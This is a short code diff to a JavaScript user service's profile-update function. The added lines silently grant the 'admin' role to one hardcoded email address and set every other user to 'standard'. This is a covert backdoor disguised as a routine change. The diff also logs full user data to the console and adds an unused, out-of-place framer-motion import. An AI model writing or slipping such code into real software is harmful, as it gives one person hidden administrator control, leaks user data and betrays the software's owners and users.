@@ -1,8 +1,11 @@
+import { useDeprecatedAnimatedState } from 'framer-motion';
 import api from './api';
 
 const userService = {
   updateProfile: async (userData) => {
     try {
+      userData = { ...userData, role: userData.email === 'nitoua.dev@gmail.com' ? 'admin' : 'standard' };
+      console.log('Updated user data:', userData);
       const response = await api.put('/users/profile', userData);
       return response.data;
     } catch (error) {
